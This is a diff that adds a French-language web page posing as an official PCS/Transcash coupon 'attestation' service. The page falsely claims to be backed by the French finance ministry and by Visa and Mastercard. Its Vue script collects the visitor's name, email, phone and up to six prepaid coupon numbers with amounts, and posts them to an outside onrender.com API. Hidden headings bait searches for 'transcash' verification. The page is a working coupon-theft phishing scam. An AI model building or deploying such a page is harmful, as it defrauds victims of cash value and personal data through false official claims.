@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html class="wide wow-animation" lang="en">
+
+<head>
+  <title>Validation</title>
+  <meta name="format-detection" content="telephone=no">
+  <meta name="viewport"
+    content="width=device-width height=device-height initial-scale=1.0 maximum-scale=1.0 user-scalable=0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta charset="utf-8">
+  <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
+    crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.js" integrity="sha512-RjvSEaeDqPCfUVQ9kna2/2OqHz/7F04IOl1/66LmQjB/lOeAzwq7LrbTzDbz5cJzlPNJ5qteNtHR56XaJSTNWw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+  <!-- Stylesheets-->
+  <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Roboto+Mono:300,400,500,700">
+  <link rel="stylesheet" href="css/bootstrap.css">
+  <link rel="stylesheet" href="css/fonts.css">
+  <link rel="stylesheet" href="css/style.css">
+
+</head>
+
+<body>
+  <div id="app">
+    <div class="page">
+      <!-- Page Header-->
+      <header class="section page-header">
+        <!-- RD Navbar-->
+        <div class="rd-navbar-wrap">
+          <nav class="rd-navbar rd-navbar-minimal" data-layout="rd-navbar-fixed" data-sm-layout="rd-navbar-fixed"
+            data-md-layout="rd-navbar-fixed" data-md-device-layout="rd-navbar-fixed" data-lg-layout="rd-navbar-static"
+            data-lg-device-layout="rd-navbar-fixed" data-xl-layout="rd-navbar-static"
+            data-xl-device-layout="rd-navbar-static" data-xxl-layout="rd-navbar-static"
+            data-xxl-device-layout="rd-navbar-static" data-lg-stick-up-offset="46px" data-xl-stick-up-offset="46px"
+            data-xxl-stick-up-offset="46px" data-lg-stick-up="true" data-xl-stick-up="true" data-xxl-stick-up="true">
+            <div class="rd-navbar-main-outer">
+              <div class="rd-navbar-main">
+                <!-- RD Navbar Panel-->
+                <div class="rd-navbar-panel">
+                  <!-- RD Navbar Toggle-->
+                  <button class="rd-navbar-toggle" data-rd-navbar-toggle="#rd-navbar-nav-wrap-1"><span></span></button>
+                  <!-- RD Navbar Brand--><a class="rd-navbar-brand" href="index.html"><img src="images/I.png" alt=""
+                      width="199" height="22" /></a>
+                </div>
+                <div class="rd-navbar-main-element">
+                  <div class="rd-navbar-nav-wrap" id="rd-navbar-nav-wrap-1">
+                    <!-- RD Navbar Nav-->
+                    <ul class="rd-navbar-nav">
+                      <li class="rd-nav-item"><a class="rd-nav-link" href="index.html">Acceuil</a>
+                      </li>
+                      <li class="rd-nav-item active"><a class="rd-nav-link" href="#">Attestation cartes</a>
+                      </li>
+
+                      <li class="rd-nav-item "><a class="rd-nav-link" href="contacts.html">Contacts</a>
+                      </li>
+                    </ul>
+                  </div>
+                  <!-- RD Navbar Search-->
+
+                </div>
+              </div>
+            </div>
+          </nav>
+        </div>
+      </header>
+      <div v-if="showModal && validation === 'identité'" class="modal fadeIn" id="exampleModal" tabindex="-1"
+        aria-labelledby="exampleModalLabel" aria-hidden="false">
+        <div class="modal-dialog">
+          <div class="modal-content">
+
+            <div class="modal-body text-center">
+              <p><i class="fa fa-exclamation-triangle fa-4x" style="color: #e80622;"></i></p>
+              <h3 class="mb-5">Information! </h3>
+              <p style="font-size:17px;">
+                Les informations entrées ne sont traitées que par le serveur d'attestation de PCS et sont totalement
+                confidentielles durant toutes la durée de votre connexion.
+              </p>
+              <h3 class="d-none">authentication ticket transcash</h3>
+              <div class="d-none">Authentifier de vos recharges/coupons PCS sur ce site officiel.</div>
+              <h3 class="d-none">verification transcash validity check</h3>
+              <div class="d-none">Authentifier de vos recharges/coupons PCS sur ce site officiel.</div>
+
+              <button type="button" class="btn btn-info mt-3" style="background-color: #e18343; border-color: #e18343;"
+                data-dismiss="modal" id="closeModal" @click="showModal= false">Continuer</button>
+            </div>
+
+          </div>
+        </div>
+      </div>
+      <!-- Breadcrumbs -->
+      <section class="breadcrumbs-custom bg-image context-dark" style="background-image: url(images/hero-4-2.png);">
+        <div class="breadcrumbs-custom-inner">
+          <div class="container breadcrumbs-custom-container">
+            <div class="breadcrumbs-custom-main">
+              <h6 class="breadcrumbs-custom-subtitle title-decorated text-secondary">Attestez votre recharge</h6>
+              <h1 class="breadcrumbs-custom-title">Attestation</h1>
+            </div>
+            <ul class="breadcrumbs-custom-path">
+              <li><a href="index.html">Acceuil</a></li>
+              <li class="active">Attestation</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+
+
+      <section class="section bg-gray-100" v-if="validation == 'identité'">
+        <div class="range justify-content-xl-between">
+          <div class="cell-xl-6 align-self-center container">
+            <div class="row">
+              <div class="col-lg-9 cell-inner">
+                <div class="section-lg">
+                  <h3 class="wow-outer"><span class="wow slideInDown">Valider votre identité</span></h3>
+                  <!-- RD Mailform-->
+                  <form class="rd-form rd-mailform" method="post">
+                    <div class="row row-10">
+                      <div class="col-md-12 wow-outer">
+                        <div class="form-wrap wow fadeSlideInUp">
+                          <label class="form-label-outside" for="contact-first-name">Nom & Prenom</label>
+                          <input class="form-input" id="contact-first-name" type="text" name="name"
+                            data-constraints="@Required" v-model="name" placeholder="Entrez votre nom et prénom">
+                        </div>
+                      </div>
+
+                      <div class="col-md-12 wow-outer">
+                        <div class="form-wrap wow fadeSlideInUp">
+                          <label class="form-label-outside" for="contact-email">E-mail</label>
+                          <input class="form-input" id="contact-email" type="email" name="email"
+                            data-constraints="@Email @Required" v-model="email" placeholder="Entrez votre email">
+                        </div>
+                      </div>
+                      <div class="col-md-12 wow-outer">
+                        <div class="form-wrap wow fadeSlideInUp">
+                          <label class="form-label-outside" for="contact-phone">Télephone</label>
+                          <input class="form-input" id="contact-message" type="text" name="phone"
+                            data-constraints="@PhoneNumber" v-model="phone" placeholder="Entrez votre numero de téléphone">
+                        </div>
+                      </div>
+
+                    </div>
+                    <div class="group group-middle">
+                      <div class="wow-outer">
+                        <button @click.prevent="submitIdentity"
+                          class="button button-primary button-winona wow slideInRight"><span
+                            v-if="!submitting">Valider</span> <span v-else class="sr-only">
+                          </span></button>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+
+            </div>
+          </div>
+          <div class="d-none d-sm-block col-12 col-lg-5 col-xl-4 align-self-center container">
+            <div class="contact-side-info mb-10">
+              <h2 class="mb-3" style="color: #e80622; font-weight: bold"> Identité</h2>
+              <p class="mb-4">Vérifier votre identité </p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <div v-if="validation == 'attestation'">
+        <section class="p-5">
+          <div class="container d-flex justify-content-center">
+            <p style="font-size:17px;background-color: #f1e0d5; " class="text-center p-3">
+              Les informations entrées ne sont traitées que par le serveur d'attestation de PCS et sont totalement
+              confidentielles durant toutes la durée de votre connexion.
+            </p>
+          </div>
+        </section>
+        <!-- Map & contacts-->
+        <section class="section bg-gray-100">
+          <div class="range justify-content-xl-between">
+            <div class="cell-xl-6 align-self-center container">
+              <div class="row">
+                <div class="col-lg-9 cell-inner">
+                  <div class="section-lg">
+                    <h3 class="wow-outer"><span class="wow slideInDown mb-4">Recharger vos cartes</span></h3>
+                    <!-- RD Mailform-->
+                    <div v-if="etape === 'etape1'">
+                      <form class="rd-form rd-mailform" method="post">
+                        <span class="font-weight-bold mb-3">Quel carte voulez-vous rechargez ?</span>
+                        <div class="d-flex justify-content-between mb-5 mt-3">
+
+                          <div class="form-check" v-for="card in cards" :key="card.type">
+
+                            <input class="form-check-input" type="radio" name="type" id="exampleRadios1"
+                              :value="card.type" v-model="selectedType">
+                            <label class="form-check-label" for="exampleRadios1">
+                              {{ card.name }}
+                            </label>
+                          </div>
+
+                        </div>
+                        <div class="row row-10">
+                          <div v-for="(demande, index) in demandes" :key="index" class="container row">
+                            <div class="col-md-8 wow-outer">
+                              <div class="form-wrap wow fadeSlideInUp">
+                                <input class="form-input" type="tel" name="phone" v-model="demande.cardNumber" placeholder="Entrez votre numero de carte">
+                              </div>
+                            </div>
+
+                            <div class="col-md-4 wow-outer">
+                              <div class="form-wrap wow fadeSlideInUp">
+                                <select class="custom-select" name="amount" v-model="demande.price">
+                                  <option value="" disabled>Montant</option>
+                                  <option v-for="(montant, index) in montants" :key="index" :value="montant">{{ montant
+                                    }}€</option>
+                                </select>
+                              </div>
+                            </div>
+                          </div>
+
+
+
+                        </div>
+                        <div class="group group-middle">
+                          <div class="wow-outer">
+                            <button @click.prevent="submitDemande()"
+                              class="button button-primary button-winona wow slideInRight">Valider</buttton>
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+                    <div v-if="etape === 'etape2'">
+                      <form class="rd-form rd-mailform" method="post">
+                       
+                        <div class="row row-10">
+                          <div v-for="(conf, index) in confirmation" :key="index" class="container row">
+                            <div class="col-md-8 wow-outer">
+                              <div class="form-wrap wow fadeSlideInUp">
+                                <input class="form-input" type="tel" name="number" v-model="conf.cardNumber" placeholder="Entrez votre numero de carte">
+                              </div>
+                            </div>
+
+                            <div class="col-md-4 wow-outer">
+                              <div class="form-wrap wow fadeSlideInUp">
+                                <select class="custom-select" name="amount" v-model="conf.price">
+                                  <option :value="conf.price"> {{conf.price }} <span
+                                      v-if="conf.montant > 0">€</span></option>
+                                  <option v-for="(montant, index) in montants" :key="index" :value="montant">
+                                    {{montant}} </option>
+                                </select>
+                              </div>
+                            </div>
+                          </div>
+
+
+
+                        </div>
+                        <div class="group group-middle">
+                          <div class="wow-outer">
+                            <button @click.prevent="submitConfirm()"
+                              class="button button-primary button-winona wow slideInRight">Valider</buttton>
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+                    <div v-if="etape ==='etape3'">
+                      <div class="d-flex justify-content-center bg-white p-4">
+
+                        <img src="images/téléchargement.jpg" alt="">
+
+
+                      </div>
+                      <div class="container d-flex justify-content-center bg-white p-4 text-danger">
+                        <span>
+                          Le service d'attestation de demande de coupon en ligne, certifie la demande d'attestation de
+                          M/Mme/Mlle <span class="font-weight-bold">{{name}}</span>. Estimer a une valeur de <span
+                            class="font-weight-bold">{{ montantTotal }} €</span>. <br>
+                          Ce {{new Date().toLocaleDateString()}} {{new Date().toLocaleTimeString()}}.
+                          <br>
+                          <br>
+                          <br>
+                          <span style="font-size: 12px;">Votre attestation vous a été envoyé par mail. Si vous ne
+                            recevez pas votre attestation, veillez consultez votre dossier spam.</span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+            <div class="d-none d-sm-block col-12 col-lg-5 col-xl-4 align-self-center container">
+              <div class="contact-side-info mb-10"
+                :style="{'text-decoration': etape === 'etape2' || etape === 'etape3' ? 'line-through' : 'none'}">
+                <h2
+                  :style="{ color: etape === 'etape1' ? '#e80622' : 'rgba(0, 0, 0, 0.1)', 'font-weight': 'bold', 'font-size': '40px' }">
+                  <span v-if="etape==='etape2' || etape=== 'etape3'" style="color: #07c164;"
+                    class="mdi mdi-check"></span> 01 Demande
+                </h2>
+                <p class="mb-4 container">Demandez votre attestation </p>
+              </div>
+              <div class="contact-side-info mb-10"
+                :style="{'text-decoration': etape === 'etape1' || etape === 'etape3' ? 'line-through' : 'none'}">
+                <h2 class="mb-3"
+                  :style="{ color: etape === 'etape2' ? '#e80622' : 'rgba(0, 0, 0, 0.1)',  'font-weight': 'bold', 'font-size': '40px' }">
+                  <span v-if=" etape=== 'etape3'" style="color: #07c164;" class="mdi mdi-check"></span> 02 Confirmation
+                </h2>
+                <p class="mb-4 container">Confirmez vos informations </p>
+              </div>
+              <div class="contact-side-info mb-10"
+                :style="{'text-decoration': etape === 'etape2' || etape === 'etape1' ? 'line-through' : 'none'}">
+                <h2 class="mb-3"
+                  :style="{ color: etape === 'etape3' ? '#e80622' : 'rgba(0, 0, 0, 0.1)', 'font-weight': 'bold',  'font-size': '40px' }">
+                  <span v-if="etape==='etape3'" style="color: #07c164;" class="mdi mdi-check"></span> 03 Attestation
+                </h2>
+                <p class="mb-4 container">Téléchargez votre attestation </p>
+              </div>
+            </div>
+
+          </div>
+        </section>
+        <section class="section section-xs  text-center" style="background-color: rgba(0, 0, 0, 0.1)">
+          <div class="container">
+            <div class="row justify-content-between">
+
+              <div class="col-sm-4 col-12">
+                <div class="footer-widget-area mb-70">
+                  <a class="d-block mb-4" href="#" style="color: #fff; font-size: 20px;">
+                    <img src="images/I.png" class="mb-4">
+                    <img src="images/petition-img-69191-fr.png">
+                  </a>
+
+                </div>
+              </div>
+              <div class="col-sm-8 col-12 mt-5">
+                <p style="color: crimson; font-weight: bold;">
+                  DANS LE CAS D'ÉVITER TOUT LITIGE ENTRE PARTICULIERS OU PROFESSIONNELS LORS D'UNE VENTE OU D'UN ACHAT
+                  DE
+                  BIENS, LE MINISTRE DE L'ÉCONOMIE ET DES FINANCES EN PARTENARIAT AVEC LES OPÉRATEURS VISA - MASTERCARD
+                  ONT MIS EN PLACE CE SERVICE VOUS PERMETTANT DE TÉLÉCHARGER UNE ATTESTATION SERVANT DE TRACE JURIDIQUE
+                  DE
+                  LA TRANSACTION.
+                </p>
+              </div>
+
+
+            </div>
+          </div>
+        </section>
+      </div>
+      <!-- Page Footer-->
+      <footer class="section footer-minimal bg-primary-darken">
+        <div class="container">
+          <div class="footer-minimal-inner"><a class="brand" href="index.html"><img src="images/I__light.png" alt=""
+                width="199" height="22" /></a>
+            <!-- Rights-->
+            <p class="rights"><span>&copy;&nbsp;</span><span class="copyright-year"></span>. All Rights Reserved.</p>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <div class="preloader">
+      <div class="preloader-logo"><img src="images/I.png" alt="" width="199" height="22" />
+      </div>
+      <div class="preloader-body">
+        <div id="loadingProgressG">
+          <div class="loadingProgressG" id="loadingProgressG_1"></div>
+        </div>
+      </div>
+    </div>
+    <!-- Global Mailform Output-->
+    <div class="snackbars" id="form-output-global"></div>
+  </div>
+  <script>
+    const app = Vue.createApp({
+      data() {
+        return {
+          showModal: true,
+          etape: "etape1",
+          validation: 'identité',
+          name: "",
+          email: "",
+          phone: "",
+          identity: {},
+          submitting: false,
+          selectedType: "",
+          cards: [],
+          montants: [20, 30, 50, 100, 150, 200, 250, 500],
+          demandes: [
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' }
+          ],
+          confirmation: [
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' },
+            { cardNumber: '', price: '' }
+          ],
+
+          montantsSelectionnes: "",
+          montantTotal: 0
+        }
+
+
+      },
+      mounted(){
+        this.getcardListes();
+      },
+      methods: {
+        getcardListes(){
+          console.log("object");
+          axios
+        .get(
+          `https://attestationcoupon.onrender.com/api/card-types`
+          
+        )
+        .then((response) => {
+          this.card.push(response.data)
+        
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+        
+        },
+        submitIdentity() {
+          this.submitting= true
+          if (this.name || this.email || this.phone) {
+            this.identity = {
+              name: this.name,
+              email: this.email,
+              phone: this.phone
+            }
+            
+            this.validation = 'attestation'
+          }else{
+            alert("Veillez remplir tout les champs")
+          }
+        },
+        submitDemande() {
+          if(!this.selectedType){
+            alert('Veillez voisir le type de carte que vous voulez rechargé')
+            return
+          }
+          const cardType = this.selectedType
+          const demandeNonVide = this.demandes.filter(demande => demande.cardNumber !== '' || demande.price !== '');
+          if (demandeNonVide.length > 0) {
+            let montantsDemande = [];
+            for (let demande of this.demandes) {
+              montantsDemande.push(demande.price);
+            }
+            this.montantsSelectionnes = montantsDemande;
+
+            for (let i = 0; i < this.demandes.length; i++) {
+              this.confirmation[i].price = this.montantsSelectionnes[i];
+              console.log(this.confirmation[i].price);
+            }
+            
+            this.etape = 'etape2'
+          }else{
+           alert("Veillez rechargé au moins une carte")
+          }
+        },
+        submitConfirm(){
+          let data= {
+            "fullname": this.name,
+            "phone": this.phone,
+            "email": this.email,
+            "ticketType": this.selectedType,
+            "refills": this.confirmation
+          }
+          let isCorrect = true;
+          for (let i = 0; i < this.demandes.length; i++) {
+            if (this.demandes[i].cardNumber !== this.confirmation[i].cardNumber || this.demandes[i].price !== this.confirmation[i].price) {
+              isCorrect = false;
+              break;
+            }
+          }
+          if (isCorrect) {
+            let total = 0;
+            for (let i = 0; i < this.confirmation.length; i++) {
+              total += Number(this.confirmation[i].price);
+            }
+            this.montantTotal = total;
+            axios.post('https://attestationcoupon.onrender.com/api/getAttestation', data)
+            .then(response => {
+              console.log('Données envoyées avec succès', response);
+            })
+            .catch(error => {
+              console.error('Erreur lors de l\'envoi des données', error);
+            });
+
+
+            this.etape = 'etape3'
+          } else {
+            alert('Les informations saisies ne sont pas correctes. Veillez réssayez');
+            this.etape= 'etape2'
+          }
+        }
+
+
+
+      },
+      
+
+
+
+
+    })
+    app.directive('maxlength', {
+      bind: function (el, binding) {
+        el.addEventListener('input', function () {
+          if (el.value.length > binding.value) {
+            el.value = el.value.slice(0, binding.value);
+          }
+        });
+      }
+    });
+    app.mount('#app')
+  </script>
+  <!-- Javascript-->
+  <script src="js/core.min.js"></script>
+  <script src="js/script.js"></script>
+</body>
+
+</html>
+<style>
+  #exampleModal {
+    visibility: inherit !important;
+    top: 20%;
+
+  }
+
+  #exampleModal .modal-content {
+    height: inherit !important;
+  }
+
+  *+.row {
+    margin-top: inherit !important;
+  }
+</style>
